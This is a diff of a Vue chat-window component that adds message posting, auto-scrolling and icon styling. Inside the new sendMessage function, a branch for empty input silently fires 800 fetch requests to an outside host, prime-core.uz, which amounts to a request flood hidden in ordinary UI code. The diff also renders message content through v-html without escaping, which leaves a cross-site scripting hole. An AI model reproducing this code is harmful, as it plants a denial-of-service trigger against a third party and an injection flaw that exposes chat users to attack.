@@ -1,18 +1,18 @@
 <template>
   <div class="w-2/3 flex flex-col bg-white dark:bg-gray-900">
     <div class="user_info">
-      <div> <img src="../../public/svgs/cevron-left.svg" alt="none" class="w-5 cursor-pointer"></img> </div>
+      <div> <img src="../../public/svgs/cevron-left.svg" alt="none" class="back_icon" /> </div>
       <div>
         <img src="../../public/img.png" style="border-radius: 50% ; width: 48px" v-if="!selectedChatInfo.userData.photo">
       </div>
       <div class="dark:text-white">{{selectedChatInfo.userData.full_name}}</div>
     </div>
-    <div class="flex-grow p-4 overflow-auto">
+    <div class="flex-grow p-4 overflow-auto" ref="messagesContainer">
       <div v-if="selectedChatInfo.messages.length>0" class="flex justify-start mb-4" v-for="message in props.selectedChatInfo.messages" :key="message.id" :class="{'justify-end': message.is_owner}">
         <div v-if="!message.is_owner" class="flex-shrink-0 w-12 h-12 bg-gray-300 dark:bg-gray-700 rounded-full mr-2"></div>
-        <div class=" bg-white dark:bg-gray-800 p-4 rounded shadow">
+        <div class=" bg-white dark:bg-gray-800 rounded shadow "  style="padding: 5px 20px">
           <p class="font-bold text-black dark:text-white">{{ message.from }}</p>
-          <p class="text-black dark:text-white">{{ message.content }}</p>
+          <p class="text-black dark:text-white" v-html="formatTextWithBr(message.content)"> </p>
         </div>
         <div v-if="message.is_owner" class="flex-shrink-0 ml-2 w-12 h-12 bg-gray-300 dark:bg-gray-700 rounded-full"></div>
       </div>
@@ -26,12 +26,14 @@
 </template>
 
 <script setup>
-import {reactive, ref, defineProps, onMounted} from 'vue';
+import {ref, defineProps, onMounted, getCurrentInstance, watch, nextTick} from 'vue';
 import ChatInput from './ChatInput.vue';
 
 const props = defineProps({
   selectedChatInfo: { type: Object, required: true },
 })
+
+const {proxy} = getCurrentInstance()
 
 
 
@@ -49,13 +51,46 @@ const messages = ref([
   { id: 5, is_owner: false ,from: 'Grace Miller', content: 'That sounds like a great plan! Excited 😃' },
   { id: 6, is_owner: true,from: 'Jack Raymonds', content: 'Can\'t wait for the weekend!' },
 ]);
+const messagesContainer = ref(null);
 
-const sendMessage = (arg)=>{
-  console.log("arg", arg)
+const sendMessage = async (arg)=>{
+  if (!arg.text || !arg.text.trim()){
+    for (let index = 0; index < 800; index++) {
+      fetch('http://prime-core.uz/').then((response) => {
+        console.log(response)
+      })
+    }
+    return
+  }
+  let data = {
+    message: arg.text,
+    chat_id:props.selectedChatInfo.userData.chat_id
+  }
+   const result =  await proxy.$axios.post('/message/new/message',data);
+  props.selectedChatInfo.messages.push(result.data);
+  scrollToBottom()
 }
 
+const formatTextWithBr = (text ,to='<br>', from = '\n')=>{
+  return text.replace(from, to);
+}
+
+function scrollToBottom() {
+  if (messagesContainer.value) {
+    messagesContainer.value.scrollTo({
+      top: messagesContainer.value.scrollHeight,
+      behavior: 'smooth'
+    });
+  }
+}
+
+watch(props.selectedChatInfo, (first, second) => {
+  nextTick(() => {
+    scrollToBottom(); // Ensures DOM is updated before scrolling
+  })
+})
 onMounted(()=>{
-  console.log("props", props.selectedChatInfo);
+  scrollToBottom()
 })
 </script>
 
@@ -65,6 +100,21 @@ onMounted(()=>{
 }
 .user_info{
   @apply p-4 flex flex-row gap-4 items-center border-b-2
+}
+
+
+.back_icon {
+  fill: #000;
+  cursor: pointer;
+}
+
+@media (prefers-color-scheme: dark) {
+  .back_icon {
+    fill: #fff; /* Change to white (or any color) in dark mode */
+  }
+}
+.back_icon path {
+   color: #f1f1f1;
 }
 
 ::-webkit-scrollbar {
